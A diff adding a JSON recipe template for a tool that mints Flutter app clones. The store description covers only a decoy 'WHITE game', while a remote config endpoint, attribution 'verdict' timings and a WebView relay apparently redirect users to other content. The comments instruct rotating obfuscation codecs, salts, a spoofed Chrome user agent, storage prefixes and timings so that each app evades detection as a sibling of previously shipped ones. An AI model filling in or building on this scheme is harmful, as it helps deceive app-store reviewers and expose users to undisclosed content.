@@ -1,0 +1,98 @@
+{
+  "$comment": [
+    "Recipe for one project. Copy this file to tool/forge/recipe.json,",
+    "fill every field (search '<' to find TODOs), then run:",
+    "",
+    "  dart run tool/forge/mint.dart",
+    "",
+    "The forge validates every field against the portfolio registry",
+    "and refuses to run if any value collides with a shipped sibling.",
+    "See .cursor/rules/portfolio_registry.md for the collision policy."
+  ],
+
+  "identity": {
+    "displayName": "<Marketing name shown in the store>",
+    "packageSlug": "<snake_case, matches pubspec.yaml name>",
+    "applicationId": "com.<vendor>.<project>",
+    "description": "<60-160 chars, describes the WHITE game only>"
+  },
+
+  "endpoints": {
+    "configEndpointUrl": "https://<project-owned-domain>/config.php",
+    "gcdBaseUrl": "https://gcdsdk.appsflyer.com/install_data/v4.0/",
+    "privacyUrl": "https://<project-owned-domain>/privacy.html",
+    "supportUrl": "https://<project-owned-domain>/support.html",
+    "homeUrl": "https://<project-owned-domain>"
+  },
+
+  "credentials": {
+    "attributionDevKey": "<AppsFlyer dev key — MUST be new per project>",
+    "messagingProjectId": "<Firebase project number — MUST be new per project>",
+    "storeNumericId": ""
+  },
+
+  "userAgent": {
+    "$comment": "Rotate the Chrome version per project. Range: 149.0.7500.10 .. 149.0.7900.250 (or a fresh major once Chrome moves on).",
+    "chromeVersion": "149.0.7827.163",
+    "webkitVersion": "537.36"
+  },
+
+  "codec": {
+    "$comment": [
+      "family: one of position_xor | fnv_lcg | rc4_ksa (see tool/forge/codecs/).",
+      "The operator picks a family that no shipped sibling used. The forge",
+      "warns when the previous project used the same family; rotate through",
+      "all three before repeating.",
+      "salt: 12-24 random bytes (dart run tool/forge/mint.dart --gen-salt)",
+      "streamLen: int in [16..48], outside every sibling's value"
+    ],
+    "family": "position_xor",
+    "salt": [47, 145, 196, 29, 119, 170, 83, 182, 8, 226, 57, 132, 92, 241, 107, 34],
+    "streamLen": 22
+  },
+
+  "timings": {
+    "$comment": "See lib/relay/config/relay_config.dart for the accepted ranges. Every value must be outside the corresponding sibling's value by at least 10%.",
+    "permissionSnoozeSeconds": 259200,
+    "organicRescueDelay": 7,
+    "verdictTimeoutSeconds": 17,
+    "firstInstallAwaitSeconds": 28,
+    "returningInstallAwaitSeconds": 6,
+    "deepLinkAwaitSeconds": 4,
+    "reachProbeTimeoutSeconds": 6,
+    "reachDropDebounceMs": 820,
+    "redirectLoopRetries": 2,
+    "cachedUrlLifetimeSeconds": 432000
+  },
+
+  "storage": {
+    "$comment": "3-5 char ASCII, ending with '_'. See lib/relay/wire/beacon_keystore.dart.",
+    "keyPrefix": "rl3_"
+  },
+
+  "notifications": {
+    "$comment": "Rotate per project. channelId MUST match AndroidManifest.xml default_notification_channel_id.",
+    "channelId": "app_alerts",
+    "channelName": "Notifications"
+  },
+
+  "webView": {
+    "uploadChannelName": "relay/upload",
+    "$comment": "Optional: subset of enhancers. Drop one, add one — see .cursor/rules/relay_forge.md.",
+    "enhancers": ["safeArea", "keyboard", "autoplay"]
+  },
+
+  "portfolioRegistryPath": "../portfolio.json",
+
+  "targets": {
+    "$comment": "Which files the forge is allowed to rewrite. Set to false to skip.",
+    "veiledBytes": true,
+    "codec": true,
+    "relayConfig": true,
+    "legalUrls": true,
+    "keystorePrefix": true,
+    "androidManifest": true,
+    "mainActivity": true,
+    "pubspec": true
+  }
+}
